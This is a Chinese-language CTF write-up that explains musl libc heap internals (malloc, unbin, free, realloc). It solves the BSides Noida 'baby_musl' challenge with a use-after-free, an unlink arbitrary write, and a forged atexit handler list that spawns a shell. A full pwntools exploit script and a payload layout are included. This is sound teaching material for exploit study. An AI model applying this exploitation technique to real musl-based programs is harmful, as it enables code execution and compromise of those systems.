# Musl Libc Pwn Learning


# musl libc pwn浅析

在defcon结束后，国内外的很多比赛都出现了musl libc的heap exploit，前几天的[BSides Noida CTF](https://ctftime.org/ctf/644)中的baby musl也以3解告终。所以找了一个时间学习一下，复现了比赛中的题目。

[musl libc](https://www.musl-libc.org/) 是一个专门为嵌入式系统开发的轻量级 libc 库，以简单、轻量和高效率为特色。有不少 Linux 发行版将其设为默认的 libc 库，用来代替体积臃肿的 glibc ，如Alpine Linux、OpenWrt和 Gentoo 等。

## 数据结构

### chunk

```c
struct chunk {
    size_t psize, csize; // 相当于 glibc 的 prev size 和 size
    struct chunk *next, *prev;
};
```

chunk的结构大致与glibc类似，chunk之间不会复用任何区域。`psize`和`csize`的最后的1bit为`inuse`控制位。若设置`inuse`标志位为1，表示 chunk 正在被使用；若没有设置`inuse`标志位，表示 chunk 已经被释放或者通过`mmap`分配的，需要通过`psize`的标志位来进一步判断 chunk 的状态。**chunk为0x20字节对齐的！！！**

### mal

```c
static struct {
    volatile uint64_t binmap;
    struct bin bins[64];
    volatile int free_lock[2];
} mal;
```

`mal`结构体类似于 glibc 中的`arena`，记录着堆的状态，有三个成员：64位无符号整数`binmap`、链表头部数组`bins`和锁`free_lock`。`binmap`记录每个 bin 是否为非空，若某个比特位为 1，表示对应的 bin 为非空，即 bin 链表中有 chunk。

### bin

```c
struct bin {
    volatile int lock[2];
    struct chunk *head;
    struct chunk *tail;
};
```

bin 链表头部的结构如上。`head`和`tail`指针分别指向首部和尾部的 chunk，同时首部 chunk 的`prev`指针和尾部 chunk 的`next`指针指向 bin 链表头部，这样构成了循环链表。当链表为空时，`head`和`tail`指针等于 0 或者指向链表头部自身。

| bin 下标 i | chunk 大小个数 |  chunk 大小范围   |            下标 i 与 chunk 大小范围的关系             |
| :--------: | :------------: | :---------------: | :---------------------------------------------------: |
|    0-31    |       1        |   0x20 – 0x400    |                     (i+1) * 0x20                      |
|   32-35    |       8        |   0x420 – 0x800   |    (0x420+(i-32)  *0x100) ~ (0x500+(i-32)*  0x100)    |
|   36-39    |       16       |  0x820 – 0x1000   |   (0x820+(i-36)  *0x200) ~ (0x1000+(i-36)*  0x200)    |
|   40-43    |       32       |  0x1020 – 0x2000  |   (0x1020+(i-40)  *0x400) ~ (0x1400+(i-40)*  0x400)   |
|   44-47    |       64       |  0x2020 – 0x4000  |   (0x2020+(i-44)  *0x800) ~ (0x2800+(i-44)*  0x800)   |
|   48-51    |      128       |  0x4020 – 0x8000  |  (0x4020+(i-48)  *0x1000) ~ (0x5000+(i-48)*  0x1000)  |
|   52-55    |      256       | 0x8020 – 0x10000  |  (0x8020+(i-52)  *0x2000) ~ (0xa000+(i-52)*  0x2000)  |
|   56-59    |      512       | 0x10020 – 0x20000 | (0x10020+(i-56)  *0x4000) ~ (0x14000+(i-56)*  0x4000) |
|   60-62    |      1024      | 0x20020 – 0x38000 | (0x20020+(i-60)  *0x8000) ~ (0x28000+(i-60)*  0x8000) |
|     63     |      无限      |   0x38000 以上    |                       0x38000 ~                       |

上面是每个 bin 的 chunk 大小范围，可以从源码中的[`bin_index_up`](https://github.com/bminor/musl/blob/v1.1.24/src/malloc/malloc.c#L96)推导出。前 32 个 bin 类似 fastbin 和 small bin，每个 bin 只对应一种大小的 chunk；后 32 个 bin 则类似 large bin，一个 bin 对应多种大小的 chunk。

## malloc

```c
void *malloc(size_t n)
{
	struct chunk *c;
	int i, j;
	// 使size n对齐
	if (adjust_size(&n) < 0) return 0;
	
	if (n > MMAP_THRESHOLD) {	// n达到了mmap分配的阈值（0x38000），使用mmap分配
		size_t len = n + OVERHEAD + PAGE_SIZE - 1 & -PAGE_SIZE;
		char *base = __mmap(0, len, PROT_READ|PROT_WRITE,
			MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
		if (base == (void *)-1) return 0;
		c = (void *)(base + SIZE_ALIGN - OVERHEAD);
		c->csize = len - (SIZE_ALIGN - OVERHEAD);
		c->psize = SIZE_ALIGN - OVERHEAD;
		return CHUNK_TO_MEM(c);
	}
	// 计算size对应的bin下标
	i = bin_index_up(n);
	for (;;) {
		uint64_t mask = mal.binmap & -(1ULL<<i);	// 查找size > n的所有bin
		if (!mask) {	// 没有能满足要求的bin，使用expand_heap申请新chunk
			c = expand_heap(n);
			if (!c) return 0;
			if (alloc_rev(c)) {
				struct chunk *x = c;
				c = PREV_CHUNK(c);
				NEXT_CHUNK(x)->psize = c->csize =
					x->csize + CHUNK_SIZE(c);
			}
			break;
		}
		j = first_set(mask);	// 获取最符合的size对应的bin
		lock_bin(j);			// 对该bin加锁
		c = mal.bins[j].head;	// 取出bin头
		if (c != BIN_TO_CHUNK(j)) {
			if (!pretrim(c, n, i, j)) unbin(c, j);//使用 pretrim 分割 c，使用 unbin 从链表中取出 c
			unlock_bin(j);
			break;
		}
		unlock_bin(j);
	}
	// 回收 c 中大小超过 n 的部分
	/* Now patch up in case we over-allocated */
	trim(c, n);

	return CHUNK_TO_MEM(c);
}
```

malloc 详细步骤：

1. 调整 `n`，增加头部长度和对齐 32 位。

2. 如果 `n > MMAP_THRESHOLD`，使用 `mmap` 创建一块大小为 `n` 的内存，返回给用户。

3. 如果 `n <= MMAP_THRESHOLD`，计算 `n`对应的 bin 下标 `i`，查找 binmap

   - 如果所有的可用 bin 均为空，延展堆空间，生成一个新的 chunk

   - 如果存在非空的可用 bin，选择大小最接近  `n`的 bin `j`，得到 bin 链表首部的 chunk `c`

     - 如果符合 `pretrim` 条件，使用 `pretrim` 分割 `c`
     - 否则使用 `unbin` 从链表中取出 `c`

   - 最后对 chunk 进行 `trim`，返回给用户。

## ubin

```c
static void unbin(struct chunk *c, int i)
{
	if (c->prev == c->next)
		a_and_64(&mal.binmap, ~(1ULL<<i));
	c->prev->next = c->next;
	c->next->prev = c->prev;
	c->csize |= C_INUSE;
	NEXT_CHUNK(c)->psize |= C_INUSE;
}
```

`ubin`相当于早期的`unlink`没有对双向链表进行检查，所以可以造成任意地址写。

## pretrim

```c
/* pretrim - trims a chunk _prior_ to removing it from its bin.
 * Must be called with i as the ideal bin for size n, j the bin
 * for the _free_ chunk self, and bin j locked. */
static int pretrim(struct chunk *self, size_t n, int i, int j)
{
	size_t n1;
	struct chunk *next, *split;

	/* We cannot pretrim if it would require re-binning. */
	if (j < 40) return 0;	// 分配的bin的小标小于40
	if (j < i+3) {			
		if (j != 63) return 0;	// j是最后的bin，chunk实际大小与分配大小差值超过mmap阈值
		n1 = CHUNK_SIZE(self);
		if (n1-n <= MMAP_THRESHOLD) return 0;	
	} else {		// i和j相隔三个以上的bin
		n1 = CHUNK_SIZE(self);
	}	// split 的大小属于 bin j 范围内，即 split 与 self 属于同一个 bin
	if (bin_index(n1-n) != j) return 0;
	// 切割出一块大小为 n 的 chunk
	next = NEXT_CHUNK(self);
	split = (void *)((char *)self + n);

	split->prev = self->prev;
	split->next = self->next;
	split->prev->next = split;
	split->next->prev = split;
	split->psize = n | C_INUSE;
	split->csize = n1-n;
	next->psize = n1-n;
	self->csize = n | C_INUSE;
	return 1;
}
```
`pretrim`用于对chunk进行切割，准确来说就是设置对应位置的标志位等，防止将超出需求的chunk给用户造成浪费。使其进行切割的条件还是很严格的，一般是分配出的chunk大小与所需chunk相差很大的时候才切割。

```c
static void trim(struct chunk *self, size_t n)
{
	size_t n1 = CHUNK_SIZE(self);
	struct chunk *next, *split;
	// chunk 实际的大小 n1 多于 n DONTCARE (0x10) 字节
	if (n >= n1 - DONTCARE) return;
	// 将 self 的大小切割为 n，剩余部分成为新的 chunk split
	next = NEXT_CHUNK(self);
	split = (void *)((char *)self + n);

	split->psize = n | C_INUSE;
	split->csize = n1-n | C_INUSE;
	next->psize = n1-n | C_INUSE;
	self->csize = n | C_INUSE;

	__bin_chunk(split);
}
```

`trim`主要作用是回收 chunk 超过需求大小的部分。`trim`将 chunk 多余的部分切割出来，然后将其释放到 bin 中，减少内存浪费。

## free

```c
void free(void *p)
{
	if (!p) return;

	struct chunk *self = MEM_TO_CHUNK(p);
	// 若 csize 没有设置 inuse 标志位，检查是否为 mmap chunk 或者 double free
	if (IS_MMAPPED(self))
		unmap_chunk(self);
	else
		__bin_chunk(self);
}

static void unmap_chunk(struct chunk *self)
{
	size_t extra = self->psize;
	char *base = (char *)self - extra;
	size_t len = CHUNK_SIZE(self) + extra;
	/* Crash on double free */ // 如果psize设置了inuse位，说明该chunk不是来着mmap分配的，double free
	if (extra & 1) a_crash();
	__munmap(base, len);
}
```

## __bin_chunk

```c
void __bin_chunk(struct chunk *self)
{
	struct chunk *next = NEXT_CHUNK(self);
	size_t final_size, new_size, size;
	int reclaim=0;
	int i;
	// new_size 是 self 原来的大小，final_size 是 self 合并空闲 chunk 后的大小
	final_size = new_size = CHUNK_SIZE(self);
	// next_chunk 中记录的psize与self的csize不符
	/* Crash on corrupted footer (likely from buffer overflow) */
	if (next->psize != self->csize) a_crash();
	// 检查 self 前后是否有空闲 chunk
	for (;;) {
		if (self->psize & next->csize & C_INUSE) {		// 若前后都在使用中
			self->csize = final_size | C_INUSE;
			next->psize = final_size | C_INUSE;
			i = bin_index(final_size);
			lock_bin(i);
			lock(mal.free_lock);
			if (self->psize & next->csize & C_INUSE) 	// 直到前后都正在使用
				break;
			unlock(mal.free_lock);
			unlock_bin(i);
		}
		// 向前合并空闲 chun
		if (alloc_rev(self)) {
			self = PREV_CHUNK(self);
			size = CHUNK_SIZE(self);
			final_size += size;
			if (new_size+size > RECLAIM && (new_size+size^size) > size)
				reclaim = 1;
		}
		// 向后合并空闲 chunk
		if (alloc_fwd(next)) {
			size = CHUNK_SIZE(next);
			final_size += size;
			if (new_size+size > RECLAIM && (new_size+size^size) > size)
				reclaim = 1;
			next = NEXT_CHUNK(next);
		}
	}
	// 在 binmap 中，将 bin i 设为非空 bin
	if (!(mal.binmap & 1ULL<<i))
		a_or_64(&mal.binmap, 1ULL<<i);

	self->csize = final_size;
	next->psize = final_size;
	unlock(mal.free_lock);
	// 将 self 加入到 bin i 链表的尾部
	self->next = BIN_TO_CHUNK(i);
	self->prev = mal.bins[i].tail;
	self->next->prev = self;
	self->prev->next = self;

	/* Replace middle of large chunks with fresh zero pages */
	if (reclaim) {
		uintptr_t a = (uintptr_t)self + SIZE_ALIGN+PAGE_SIZE-1 & -PAGE_SIZE;
		uintptr_t b = (uintptr_t)next - SIZE_ALIGN & -PAGE_SIZE;
#if 1
		__madvise((void *)a, b-a, MADV_DONTNEED);
#else
		__mmap((void *)a, b-a, PROT_READ|PROT_WRITE,
			MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
#endif
	}

	unlock_bin(i);
}
```

## realloc

```c
void *realloc(void *p, size_t n)
{
	struct chunk *self, *next;
	size_t n0, n1;
	void *new;

	if (!p) return malloc(n);

	if (adjust_size(&n) < 0) return 0;

	self = MEM_TO_CHUNK(p);
	n1 = n0 = CHUNK_SIZE(self);
	// mmaped chunk
	if (IS_MMAPPED(self)) {
		size_t extra = self->psize;
		char *base = (char *)self - extra;
		size_t oldlen = n0 + extra;
		size_t newlen = n + extra;
		/* Crash on realloc of freed chunk */
		if (extra & 1) a_crash();
		if (newlen < PAGE_SIZE && (new = malloc(n-OVERHEAD))) {
			n0 = n;
			goto copy_free_ret;
		}
		newlen = (newlen + PAGE_SIZE-1) & -PAGE_SIZE;
		if (oldlen == newlen) return p;
		base = __mremap(base, oldlen, newlen, MREMAP_MAYMOVE);
		if (base == (void *)-1)
			goto copy_realloc;
		self = (void *)(base + extra);
		self->csize = newlen - extra;
		return CHUNK_TO_MEM(self);
	}

	next = NEXT_CHUNK(self);
	// size不一致
	/* Crash on corrupted footer (likely from buffer overflow) */
	if (next->psize != self->csize) a_crash();

	/* Merge adjacent chunks if we need more space. This is not
	 * a waste of time even if we fail to get enough space, because our
	 * subsequent call to free would otherwise have to do the merge. */
	if (n > n1 && alloc_fwd(next)) {	// 尝试向后合并
		n1 += CHUNK_SIZE(next);
		next = NEXT_CHUNK(next);
	}
	/* FIXME: find what's wrong here and reenable it..? */
	if (0 && n > n1 && alloc_rev(self)) {	// 尝试向前合并
		self = PREV_CHUNK(self);
		n1 += CHUNK_SIZE(self);
	}
	self->csize = n1 | C_INUSE;
	next->psize = n1 | C_INUSE;

	/* If we got enough space, split off the excess and return */
	if (n <= n1) {		// 当前chunk的size足够大，切割它，直接返回
		//memmove(CHUNK_TO_MEM(self), p, n0-OVERHEAD);
		trim(self, n);
		return CHUNK_TO_MEM(self);
	}

copy_realloc:
	/* As a last resort, allocate a new chunk and copy to it. */
	new = malloc(n-OVERHEAD);	// 尝试了合并后，仍没有满足要求，申请新chunk
	if (!new) return 0;
copy_free_ret:
	memcpy(new, p, n0-OVERHEAD);	// 数据拷贝
	free(CHUNK_TO_MEM(self));	// free 原来的chunk
	return new;
}
```

- p == NULL：malloc（new）

- p != NULL：无论如何都尝试前后合并
  - new<=old：分割
  - new>old：
    - 可以满足：返回chunk指针
    - 不能满足：malloc(new)
  - new == 0 ：chunk被放入bin中

## 例题：BSides Noida CTF

yudai师傅ak了pwn太强了。

**new**

```c
unsigned __int64 new()
{
  __int64 v0; // rbx
  __int64 v2; // [rsp+8h] [rbp-28h] BYREF
  size_t size; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  puts("Enter index");
  scanf("%lu", &v2);
  puts("Enter size");
  scanf("%lu", &size);
  v0 = v2;
  chunks[v0] = malloc(size);
  data[v2] = size;
  return __readfsqword(0x28u) ^ v4;
}
```

**del**

```c
unsigned __int64 del()
{
  unsigned __int64 v1; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Enter index");
  scanf("%lu", &v1);
  if ( v1 <= 3 && chunks[v1] )
    free((void *)chunks[v1]);
  return __readfsqword(0x28u) ^ v2;
}
```

**edit**

```c
unsigned __int64 edit()
{
  unsigned __int64 idx; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Enter index");
  scanf("%lu", &idx);
  if ( idx <= 3 && chunks[idx] )
  {
    puts("Enter data");
    read(0, (void *)chunks[idx], (int)data[idx]);
  }
  return __readfsqword(0x28u) ^ v2;
}
```

**show**

```c
unsigned __int64 show()
{
  __int64 v1; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Enter index");
  scanf("%lu", &v1);
  puts((const char *)chunks[v1]);
  return __readfsqword(0x28u) ^ v2;
}
```

可以明显看到uaf，在new中没有处理下标，可以覆盖data数组实现溢出。musl libc的ubbin可进行任意地址写任意值，关键点是向什么地方写什么东西才能劫持程序流程。

### exit劫持

查看`exit`源码：

```c
_Noreturn void exit(int code)
{
	__funcs_on_exit();
	__libc_exit_fini();
	__stdio_exit();
	_Exit(code);
}

```

```c
/* Ensure that at least 32 atexit handlers can be registered without malloc */
#define COUNT 32

static struct fl
{
	struct fl *next; 			// +0x00	8 	Bytes
	void (*f[COUNT])(void *);	// +0x08	8*32 Bytes
	void *a[COUNT];				// +0x108 	8*32 Bytes
} builtin, *head;				// 0x208 	512 Bytes

	[...]

void __funcs_on_exit()
{
	void (*func)(void *), *arg;
	LOCK(lock);
	for (; head; head=head->next, slot=COUNT) while(slot-->0) {
		func = head->f[slot];
		arg = head->a[slot];
		UNLOCK(lock);
		func(arg);
		LOCK(lock);
	}
}
```

在`__funcs_on_exit`中调用了多个函数，我们对exit进行调试。

```bash
► 0x7f1bd68c1080 <exit>       endbr64 
   0x7f1bd68c1084 <exit+4>     push   rbp
   0x7f1bd68c1085 <exit+5>     mov    ebp, edi
   0x7f1bd68c1087 <exit+7>     call   0x7f1bd68cb570 <0x7f1bd68cb570>
 
   0x7f1bd68c108c <exit+12>    call   0x7f1bd6921f80 <0x7f1bd6921f80>
 
   0x7f1bd68c1091 <exit+17>    xor    eax, eax
   0x7f1bd68c1093 <exit+19>    call   0x7f1bd6906ca0 <0x7f1bd6906ca0>
 
   0x7f1bd68c1098 <exit+24>    mov    edi, ebp
   0x7f1bd68c109a <exit+26>    call   _Exit <_Exit>
```

对应源码中四个函数

`__funcs_on_exit`对应汇编如下：

```assembly
=> 0x7f1bd68cb570:	endbr64 
   0x7f1bd68cb574:	push   r12
   0x7f1bd68cb576:	lea    rdi,[rip+0x93beb]        # 0x7f1bd695f168
   0x7f1bd68cb57d:	push   rbp
   0x7f1bd68cb57e:	push   rbx
   0x7f1bd68cb57f:	call   0x7f1bd6915500 			# LOCK(lock)
   0x7f1bd68cb584:	mov    rdx,QWORD PTR [rip+0x939cd]        # 0x7f1bd695ef58
   0x7f1bd68cb58b:	test   rdx,rdx	# head
   0x7f1bd68cb58e:	je     0x7f1bd68cb630
   0x7f1bd68cb594:	mov    ecx,DWORD PTR [rip+0x93bd2]        # 0x7f1bd695f16c
   0x7f1bd68cb59a:	lea    eax,[rcx-0x1]
   0x7f1bd68cb59d:	mov    DWORD PTR [rip+0x93bc9],eax        # 0x7f1bd695f16c
   0x7f1bd68cb5a3:	test   ecx,ecx	# slot
   0x7f1bd68cb5a5:	jle    0x7f1bd68cb600
   0x7f1bd68cb5a7:	nop    WORD PTR [rax+rax*1+0x0]
   0x7f1bd68cb5b0:	lea    rbx,[rip+0x93bb1]        # 0x7f1bd695f168 lock
   0x7f1bd68cb5b7:	nop    WORD PTR [rax+rax*1+0x0]
   0x7f1bd68cb5c0:	cdqe   
   0x7f1bd68cb5c2:	mov    rdi,rbx
   0x7f1bd68cb5c5:	lea    rax,[rdx+rax*8]
   0x7f1bd68cb5c9:	mov    r12,QWORD PTR [rax+0x108] # arg
   0x7f1bd68cb5d0:	mov    rbp,QWORD PTR [rax+0x8]   # func
   0x7f1bd68cb5d4:	call   0x7f1bd69155d0		# UNLOCK(lock)
   0x7f1bd68cb5d9:	mov    rdi,r12
   0x7f1bd68cb5dc:	call   rbp   			#  <--- func(arg)
   0x7f1bd68cb5de:	mov    rdi,rbx
   0x7f1bd68cb5e1:	call   0x7f1bd6915500		# LOCK(lock)
   0x7f1bd68cb5e6:	mov    edx,DWORD PTR [rip+0x93b80]        # 0x7f1bd695f16c
   0x7f1bd68cb5ec:	lea    eax,[rdx-0x1]
   0x7f1bd68cb5ef:	test   edx,edx			# slot
   0x7f1bd68cb5f1:	mov    rdx,QWORD PTR [rip+0x93960]        # 0x7f1bd695ef58
   0x7f1bd68cb5f8:	mov    DWORD PTR [rip+0x93b6e],eax        # 0x7f1bd695f16c
   0x7f1bd68cb5fe:	jg     0x7f1bd68cb5c0
   0x7f1bd68cb600:	mov    DWORD PTR [rip+0x93b62],0x20        # 0x7f1bd695f16c
   0x7f1bd68cb60a:	mov    rdx,QWORD PTR [rdx]
   0x7f1bd68cb60d:	mov    QWORD PTR [rip+0x93944],rdx        # 0x7f1bd695ef58
   0x7f1bd68cb614:	test   rdx,rdx			# head
   0x7f1bd68cb617:	je     0x7f1bd68cb630
   0x7f1bd68cb619:	mov    DWORD PTR [rip+0x93b49],0x1f        # 0x7f1bd695f16c
   0x7f1bd68cb623:	mov    eax,0x1f
   0x7f1bd68cb628:	jmp    0x7f1bd68cb5b0
   0x7f1bd68cb62a:	nop    WORD PTR [rax+rax*1+0x0]
   0x7f1bd68cb630:	pop    rbx
   0x7f1bd68cb631:	pop    rbp
   0x7f1bd68cb632:	pop    r12
   0x7f1bd68cb634:	ret 
```

经过分析，`head`的地址为`0x7f1bd695ef58`

```assembly
pwndbg> tele 0x7f1bd695ef58
00:0000│   0x7f1bd695ef58 —▸ 0x7f1bd695f3e0 ◂— 0x7f1bd695f3e0
01:0008│   0x7f1bd695ef60 (program_invocation_name) —▸ 0x7ffe5ce0216a ◂— './baby_musl'
02:0010│   0x7f1bd695ef68 (program_invocation_short_name) —▸ 0x7ffe5ce0216c ◂— 'baby_musl'
03:0018│   0x7f1bd695ef70 ◂— 0x0
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x556d8f800000     0x556d8f801000 r-xp     1000 0      /home/neibelungen/Desktop/PWN/BSCTF/baby_musl/baby_musl
    0x556d8fa01000     0x556d8fa02000 r--p     1000 1000   /home/neibelungen/Desktop/PWN/BSCTF/baby_musl/baby_musl
    0x556d8fa02000     0x556d8fa03000 rw-p     1000 2000   /home/neibelungen/Desktop/PWN/BSCTF/baby_musl/baby_musl
    0x7f1bd68ac000     0x7f1bd68c1000 r--p    15000 0      /usr/lib/x86_64-linux-musl/libc.so
    0x7f1bd68c1000     0x7f1bd6925000 r-xp    64000 15000  /usr/lib/x86_64-linux-musl/libc.so
    0x7f1bd6925000     0x7f1bd695b000 r--p    36000 79000  /usr/lib/x86_64-linux-musl/libc.so
    0x7f1bd695b000     0x7f1bd695c000 r--p     1000 ae000  /usr/lib/x86_64-linux-musl/libc.so
    0x7f1bd695c000     0x7f1bd695d000 rw-p     1000 af000  /usr/lib/x86_64-linux-musl/libc.so
    0x7f1bd695d000     0x7f1bd6960000 rw-p     3000 0      
    0x7ffe5cde2000     0x7ffe5ce03000 rw-p    21000 0      [stack]
    0x7ffe5cf1f000     0x7ffe5cf23000 r--p     4000 0      [vvar]
    0x7ffe5cf23000     0x7ffe5cf25000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]
```

可以看到它位于可读可写段，而其结构地址关系如下：

```c
arg  = head + 0x108 + slot*8
func = head + 	0x8	+ slot*8
```

可以通过伪造这部分结构执行多次`func(arg)`达到攻击效果，在这里我们只需要执行一次`system("/bin/sh")`即可。

构造payload如下。

```python
payload = p64(fake_fl)
payload += b'A' * 0xf8
payload += p64(system)
payload += b'A' * 0xf8
payload += p64(binsh)
```

查看对应内存：

```c
pwndbg> x/70gx 0x7f1bd695f3e0
0x7f1bd695f3e0:	0x00007f1bd695f3e0	0x4141414141414141
0x7f1bd695f3f0:	0x4141414141414141	0x00007f1bd695ef48
0x7f1bd695f400:	0x4141414141414141	0x4141414141414141
0x7f1bd695f410:	0x4141414141414141	0x4141414141414141
0x7f1bd695f420:	0x4141414141414141	0x4141414141414141
0x7f1bd695f430:	0x4141414141414141	0x4141414141414141
0x7f1bd695f440:	0x4141414141414141	0x4141414141414141
0x7f1bd695f450:	0x4141414141414141	0x4141414141414141
0x7f1bd695f460:	0x4141414141414141	0x4141414141414141
0x7f1bd695f470:	0x4141414141414141	0x4141414141414141
0x7f1bd695f480:	0x4141414141414141	0x4141414141414141
0x7f1bd695f490:	0x4141414141414141	0x4141414141414141
0x7f1bd695f4a0:	0x4141414141414141	0x4141414141414141
0x7f1bd695f4b0:	0x4141414141414141	0x4141414141414141
0x7f1bd695f4c0:	0x4141414141414141	0x4141414141414141
0x7f1bd695f4d0:	0x4141414141414141	0x4141414141414141
0x7f1bd695f4e0:	0x00007f1bd68faf80	0x4141414141414141
0x7f1bd695f4f0:	0x4141414141414141	0x4141414141414141
0x7f1bd695f500:	0x4141414141414141	0x4141414141414141
0x7f1bd695f510:	0x4141414141414141	0x4141414141414141
0x7f1bd695f520:	0x4141414141414141	0x4141414141414141
0x7f1bd695f530:	0x4141414141414141	0x4141414141414141
0x7f1bd695f540:	0x4141414141414141	0x4141414141414141
0x7f1bd695f550:	0x4141414141414141	0x4141414141414141
0x7f1bd695f560:	0x4141414141414141	0x4141414141414141
0x7f1bd695f570:	0x4141414141414141	0x4141414141414141
0x7f1bd695f580:	0x4141414141414141	0x4141414141414141
0x7f1bd695f590:	0x4141414141414141	0x4141414141414141
0x7f1bd695f5a0:	0x4141414141414141	0x4141414141414141
0x7f1bd695f5b0:	0x4141414141414141	0x4141414141414141
0x7f1bd695f5c0:	0x4141414141414141	0x4141414141414141
0x7f1bd695f5d0:	0x4141414141414141	0x4141414141414141
0x7f1bd695f5e0:	0x00007f1bd6954dd0	0x0000000000000000
0x7f1bd695f5f0:	0x0000000000000221	0x0000000000000a00
0x7f1bd695f600:	0x00007f1bd695cda0	0x00007f1bd695cda0
```

### exp

```python
from pwn import *

binary = './baby_musl'
# context.terminal = ['tmux', 'splitw', '-h']
context(binary=binary, log_level='debug')
p = process(binary)
# p = remote('chall.pwnable.tw',10202)
elf = ELF(binary)
libc = ELF('/usr/lib/x86_64-linux-musl/libc.so')

def leak(name, addr): return log.success(
    '{0} addr ---> {1}'.format(name, hex(addr)))

def cmd(idx):
    p.sendlineafter('[4] Show', str(idx))

def add(idx, size):
    cmd(1)
    p.sendlineafter('Enter index', str(idx))
    p.sendlineafter('Enter size', str(size))

def dele(idx):
    cmd(2)
    p.sendlineafter('Enter index', str(idx))

def edit(idx, data):
    cmd(3)
    p.sendlineafter('Enter index', str(idx))
    p.sendafter('Enter data', data)

def show(idx):
    cmd(4)
    p.sendlineafter('Enter index', str(idx))

p.sendline('Niebelungen')

add(0, 0x18)
show(0)

libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 0xb0dd0
fake_fl = libc_base + 0xb33e0
head_addr = libc_base + 0xb2f58 - 0x10
system = libc_base + libc.sym['system']
binsh = libc_base+next(libc.search('/bin/sh'))
leak('libc addr', libc_base)

add(1, 0x60)
add(2, 0x208)  # fake_fl

dele(1)
edit(1, p64(fake_fl) + p64(head_addr))

payload = p64(fake_fl)
payload += b'A' * 0xf8
payload += p64(system)
payload += b'A' * 0xf8
payload += p64(binsh)
edit(2, payload)

# gdb.attach(p)
add(1, 0x10)
p.sendline('0')

p.interactive()

```

